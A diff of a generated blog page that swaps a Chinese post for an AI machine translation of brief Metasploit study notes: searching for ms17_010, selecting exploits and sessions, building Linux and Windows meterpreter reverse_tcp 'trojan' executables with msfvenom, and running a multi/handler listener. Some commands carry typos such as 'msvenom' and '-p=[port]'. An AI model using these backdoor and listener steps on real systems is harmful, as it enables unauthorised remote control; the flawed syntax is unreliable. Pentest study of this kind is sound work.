@@ -7,24 +7,24 @@
   
   <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)","en":"Copy successfully (*^▽^*)","ja":"コピー成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ","en":"Copy failed (ﾟ⊿ﾟ)ﾂ","ja":"コピー失敗 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://blog.wray7.top';window.REIMU_CONFIG.relative = '/';window.REIMU_CONFIG.i18n_languages = ["en","ja"];window.REIMU_CONFIG.dark_mode = {"button":true,"mode":"auto"};</script>
   <title>
-    msf使用 | Wray的Blog
+    MSF usage | Wray的Blog
   </title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
     <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
     
-<link rel="stylesheet" href="/css/loader.css?v=mv3f1dj6">
+<link rel="stylesheet" href="/css/loader.css?v=mv3g39ky">
 
-    <meta name="description" content="msf使用metasploit 流程msfconsole  search [ms17_010] 查找漏洞  use [] 选择漏洞  show options 查看参数  session 查看会话 session [num] 选择会话   12run vnc  后门msvenom -p [payload] lhost&#x3D;[] lport&#x3D;[] -f(format) exe -o(output) fi">
+    <meta name="description" content="Machine translated from Chinese by AI. For accuracy, please refer to the Chinese original.  MSF Usagemetasploit Workflowmsfconsole  search [ms17_010] Search for vulnerabilities  use [] Select vulnera">
 <meta property="og:type" content="article">
-<meta property="og:title" content="msf使用">
+<meta property="og:title" content="MSF usage">
 <meta property="og:url" content="https://blog.wray7.top/en/2022/12/23/2022-12-23-msf%E4%BD%BF%E7%94%A8/index.html">
 <meta property="og:site_name" content="Wray的Blog">
-<meta property="og:description" content="msf使用metasploit 流程msfconsole  search [ms17_010] 查找漏洞  use [] 选择漏洞  show options 查看参数  session 查看会话 session [num] 选择会话   12run vnc  后门msvenom -p [payload] lhost&#x3D;[] lport&#x3D;[] -f(format) exe -o(output) fi">
+<meta property="og:description" content="Machine translated from Chinese by AI. For accuracy, please refer to the Chinese original.  MSF Usagemetasploit Workflowmsfconsole  search [ms17_010] Search for vulnerabilities  use [] Select vulnera">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://blog.wray7.top/home/wray/.config/Typora/typora-user-images/image-20221223144819404.png">
 <meta property="article:published_time" content="2022-12-23T08:26:47.000Z">
-<meta property="article:modified_time" content="2026-10-10T17:51:58.341Z">
+<meta property="article:modified_time" content="2026-10-10T21:09:50.264Z">
 <meta property="article:author" content="Wray Lee">
 <meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary">
@@ -33,7 +33,7 @@
     <link rel="alternate" href="/atom.xml" title="Wray的Blog" type="application/atom+xml">
     <link rel="shortcut icon" href="/images/favicon.ico">
   
-<link rel="stylesheet" href="/css/style.css?v=mv3f1dj6">
+<link rel="stylesheet" href="/css/style.css?v=mv3g39ky">
 
   <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
     
@@ -178,11 +178,11 @@
 <header id="header" aria-label="Site header">
         <picture>
         </picture>
-          <img data-random-banner onerror="this.onerror=null;this.src='/images/banner.webp'"  fetchpriority="high" src="/images/banner.webp" alt="msf使用">
+          <img data-random-banner onerror="this.onerror=null;this.src='/images/banner.webp'"  fetchpriority="high" src="/images/banner.webp" alt="MSF usage">
   <div id="header-outer">
     <div id="header-title">
           <span id="logo">
-            <h1 data-aos="slide-up">msf使用</h1>
+            <h1 data-aos="slide-up">MSF usage</h1>
           </span>
         <h2 id="subtitle-wrap" data-aos="slide-down">
         </h2>
@@ -197,7 +197,7 @@
     <div class="sidebar-wrap" data-aos="fade-up">
           <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#msf%E4%BD%BF%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">msf使用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.</span> <span class="toc-text">流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E9%97%A8"><span class="toc-number">1.2.</span> <span class="toc-text">后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%91%E5%90%AC"><span class="toc-number">1.3.</span> <span class="toc-text">监听</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E4%B8%BB%E6%9C%BA"><span class="toc-number">2.</span> <span class="toc-text">攻击主机</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.0.1.</span> <span class="toc-text">生成木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%91%E5%90%AC%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.0.2.</span> <span class="toc-text">监听木马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E4%BB%B6"><span class="toc-number">2.1.</span> <span class="toc-text">附件</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MSF-Usage"><span class="toc-number">1.</span> <span class="toc-text">MSF Usage</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Workflow"><span class="toc-number">1.1.</span> <span class="toc-text">Workflow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Backdoor"><span class="toc-number">1.2.</span> <span class="toc-text">Backdoor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Listener"><span class="toc-number">1.3.</span> <span class="toc-text">Listener</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Attack-Host"><span class="toc-number">2.</span> <span class="toc-text">Attack Host</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Generate-Trojan"><span class="toc-number">2.0.1.</span> <span class="toc-text">Generate Trojan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Trojan-Listener"><span class="toc-number">2.0.2.</span> <span class="toc-text">Trojan Listener</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Attachments"><span class="toc-number">2.1.</span> <span class="toc-text">Attachments</span></a></li></ol></li></ol>
 </div>
 </div>
           <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -265,7 +265,7 @@
   </div>
 </aside>
 
-          <section id="main" aria-label="Main content"><article id="post-2022-12-23-msf使用" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+          <section id="main" aria-label="Main content"><article id="post-2022-12-23-msf使用.en" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-inner" data-aos="fade-up">
     <div class="article-meta">
       <div class="article-date">
@@ -280,31 +280,34 @@
     <div class="hr-line"></div>
     
     <div class="e-content article-entry" itemprop="articleBody">
-        <h1 id="msf使用"><a href="#msf使用" class="headerlink" title="msf使用"></a>msf使用</h1><p>metasploit</p>
-<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p><code>msfconsole</code></p>
+        <blockquote>
+<p>Machine translated from Chinese by AI. For accuracy, please refer to the Chinese original.</p>
+</blockquote>
+<h1 id="MSF-Usage"><a href="#MSF-Usage" class="headerlink" title="MSF Usage"></a>MSF Usage</h1><p>metasploit</p>
+<h2 id="Workflow"><a href="#Workflow" class="headerlink" title="Workflow"></a>Workflow</h2><p><code>msfconsole</code></p>
 <ol>
-<li><p><code>search [ms17_010]</code> 查找漏洞</p>
+<li><p><code>search [ms17_010]</code> Search for vulnerabilities</p>
 </li>
-<li><p><code>use []</code> 选择漏洞</p>
+<li><p><code>use []</code> Select vulnerability</p>
 </li>
-<li><p><code>show options</code> 查看参数</p>
+<li><p><code>show options</code> View parameters</p>
 </li>
-<li><p><code>session</code> 查看会话</p>
-<p><code>session [num]</code> 选择会话</p>
+<li><p><code>session</code> View sessions</p>
+<p><code>session [num]</code> Select session</p>
 </li>
 </ol>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run vnc</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><p><code>msvenom -p [payload] lhost=[] lport=[] -f(format) exe -o(output) file_name.exe</code></p>
-<h2 id="监听"><a href="#监听" class="headerlink" title="监听"></a>监听</h2><p><code>use exploit/multi/handler</code></p>
-<h1 id="攻击主机"><a href="#攻击主机" class="headerlink" title="攻击主机"></a>攻击主机</h1><p><img src="/home/wray/.config/Typora/typora-user-images/image-20221223144819404.png" alt="image-20221223144819404"></p>
-<h3 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h3><p>linux : <code>msvenom -p linux/x64/meterpreter/reverse_tcp lhost=[host] -p=[port] -f elf -o .elf</code></p>
+<h2 id="Backdoor"><a href="#Backdoor" class="headerlink" title="Backdoor"></a>Backdoor</h2><p><code>msvenom -p [payload] lhost=[] lport=[] -f(format) exe -o(output) file_name.exe</code></p>
+<h2 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h2><p><code>use exploit/multi/handler</code></p>
+<h1 id="Attack-Host"><a href="#Attack-Host" class="headerlink" title="Attack Host"></a>Attack Host</h1><p><img src="/home/wray/.config/Typora/typora-user-images/image-20221223144819404.png" alt="image-20221223144819404"></p>
+<h3 id="Generate-Trojan"><a href="#Generate-Trojan" class="headerlink" title="Generate Trojan"></a>Generate Trojan</h3><p>linux : <code>msvenom -p linux/x64/meterpreter/reverse_tcp lhost=[host] -p=[port] -f elf -o .elf</code></p>
 <p>win: <code>msvenom -p windows/meterpreter/reverse_tcp lhost=[host] -p=[port] -f exe -o .exe</code></p>
-<h3 id="监听木马"><a href="#监听木马" class="headerlink" title="监听木马"></a>监听木马</h3><p><code>handler -p [] lhost=[] -p []</code></p>
+<h3 id="Trojan-Listener"><a href="#Trojan-Listener" class="headerlink" title="Trojan Listener"></a>Trojan Listener</h3><p><code>handler -p [] lhost=[] -p []</code></p>
 <p><code>use exploit/multi/handler</code></p>
 <p><code>set</code></p>
 <p><code>run</code></p>
-<h2 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h2><ul>
+<h2 id="Attachments"><a href="#Attachments" class="headerlink" title="Attachments"></a>Attachments</h2><ul>
 <li><a href="xss_eg.pdf">xss_eg.pdf</a></li>
 </ul>
 
@@ -317,19 +320,19 @@
   </div>
     <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
       <div class="article-nav-link-wrap left">
-            <img data-random-banner onerror="this.onerror=null;this.src='/images/banner.webp'" data-src="/images/banner.webp" data-sizes="auto" alt="(子级域名访问)域名代理语法" class="lazyload">
-        <a href="/en/2023/01/09/2023-01-08-(%E5%AD%90%E7%BA%A7%E5%9F%9F%E5%90%8D%E8%AE%BF%E9%97%AE)%E5%9F%9F%E5%90%8D%E4%BB%A3%E7%90%86%E8%AF%AD%E6%B3%95/" aria-label="Prev: (子级域名访问)域名代理语法" title="Prev: (子级域名访问)域名代理语法"></a>
+            <img data-random-banner onerror="this.onerror=null;this.src='/images/banner.webp'" data-src="/images/banner.webp" data-sizes="auto" alt="(Subdomain Access) Domain Proxy Syntax" class="lazyload">
+        <a href="/en/2023/01/09/2023-01-08-(%E5%AD%90%E7%BA%A7%E5%9F%9F%E5%90%8D%E8%AE%BF%E9%97%AE)%E5%9F%9F%E5%90%8D%E4%BB%A3%E7%90%86%E8%AF%AD%E6%B3%95/" aria-label="Prev: (Subdomain Access) Domain Proxy Syntax" title="Prev: (Subdomain Access) Domain Proxy Syntax"></a>
         <div class="article-nav-caption">Prev</div>
         <h3 class="article-nav-title">
-            (子级域名访问)域名代理语法
+            (Subdomain Access) Domain Proxy Syntax
         </h3>
       </div>
     <div class="article-nav-link-wrap right">
-          <img data-random-banner onerror="this.onerror=null;this.src='/images/banner.webp'" data-src="/images/banner.webp" data-sizes="auto" alt="信息收集" class="lazyload">
-      <a href="/en/2022/12/20/2022-12-20-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" aria-label="Next: 信息收集"  title="Next: 信息收集"></a>
+          <img data-random-banner onerror="this.onerror=null;this.src='/images/banner.webp'" data-src="/images/banner.webp" data-sizes="auto" alt="Information Collection" class="lazyload">
+      <a href="/en/2022/12/20/2022-12-20-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" aria-label="Next: Information Collection"  title="Next: Information Collection"></a>
       <div class="article-nav-caption">Next</div>
       <h3 class="article-nav-title">
-          信息收集
+          Information Collection
       </h3>
     </div>
   </nav>
@@ -381,7 +384,7 @@
   <div class="sidebar-wrap">
         <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#msf%E4%BD%BF%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">msf使用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.</span> <span class="toc-text">流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E9%97%A8"><span class="toc-number">1.2.</span> <span class="toc-text">后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%91%E5%90%AC"><span class="toc-number">1.3.</span> <span class="toc-text">监听</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E4%B8%BB%E6%9C%BA"><span class="toc-number">2.</span> <span class="toc-text">攻击主机</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.0.1.</span> <span class="toc-text">生成木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%91%E5%90%AC%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.0.2.</span> <span class="toc-text">监听木马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E4%BB%B6"><span class="toc-number">2.1.</span> <span class="toc-text">附件</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MSF-Usage"><span class="toc-number">1.</span> <span class="toc-text">MSF Usage</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Workflow"><span class="toc-number">1.1.</span> <span class="toc-text">Workflow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Backdoor"><span class="toc-number">1.2.</span> <span class="toc-text">Backdoor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Listener"><span class="toc-number">1.3.</span> <span class="toc-text">Listener</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Attack-Host"><span class="toc-number">2.</span> <span class="toc-text">Attack Host</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Generate-Trojan"><span class="toc-number">2.0.1.</span> <span class="toc-text">Generate Trojan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Trojan-Listener"><span class="toc-number">2.0.2.</span> <span class="toc-text">Trojan Listener</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Attachments"><span class="toc-number">2.1.</span> <span class="toc-text">Attachments</span></a></li></ol></li></ol>
 </div>
 </div>
         <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -470,11 +473,11 @@
 
 
 
-<script src="/js/script.js?v=mv3f1dj6"></script>
+<script src="/js/script.js?v=mv3g39ky"></script>
 
 
   
-<script src="/js/aos.js?v=mv3f1dj6"></script>
+<script src="/js/aos.js?v=mv3g39ky"></script>
 
   <script>
     var aosInit = () => {
@@ -493,11 +496,11 @@
   </script>
 
 
-<script src="/js/pjax_script.js?v=mv3f1dj6" data-pjax></script>
+<script src="/js/pjax_script.js?v=mv3g39ky" data-pjax></script>
 
 
   
-<script src="/js/generator_search.js?v=mv3f1dj6" defer></script>
+<script src="/js/generator_search.js?v=mv3g39ky" defer></script>
 
 
 
@@ -523,21 +526,21 @@
       <script data-pjax>
         window.REIMU_POST = {
           author: "Wray Lee",
-          title: "msf使用",
+          title: "MSF usage",
           url: "https://blog.wray7.top/2022/12/23/2022-12-23-msf%E4%BD%BF%E7%94%A8/",
           excerpt: "",
           description: "",
-          stripContent: "msf使用metasploit 流程msfconsole  search [ms17_010] 查找漏洞  use [] 选择漏洞  show options 查看参数  session 查看会话 session [num] 选择会话   12run vnc  后门msvenom -p [payload] lhost=[] lport=[] -f(format) exe -o(output) file_name.exe 监听use exploit/multi/handler 攻击主机 生成木马l",
+          stripContent: " Machine translated from Chinese by AI. For accuracy, please refer to the Chinese original.  MSF Usagemetasploit Workflowmsfconsole  search [ms17_010] Search for vulnerabilities  use [] Select vulnerability  show options View parameters  session View",
           date: "Fri Dec 23 2022 16:26:47 GMT+0800",
-          updated: "Sun Oct 11 2026 01:51:58 GMT+0800",
+          updated: "Sun Oct 11 2026 05:09:50 GMT+0800",
           cover: "/images/banner.webp",
         };
       </script>
         
-<script src="/js/insert_highlight.js?v=mv3f1dj6" data-pjax></script>
+<script src="/js/insert_highlight.js?v=mv3g39ky" data-pjax></script>
 
       
-<script src="/js/tabs.js?v=mv3f1dj6" data-pjax defer></script>
+<script src="/js/tabs.js?v=mv3g39ky" data-pjax defer></script>
 
       <script type="module" data-pjax>
         (async () => {
@@ -596,5 +599,5 @@
 
 
 
-  <script src="/js/banner-gallery.js?v=mv3f1dj6"></script></body>
+  <script src="/js/banner-gallery.js?v=mv3g39ky"></script></body>
   </html>
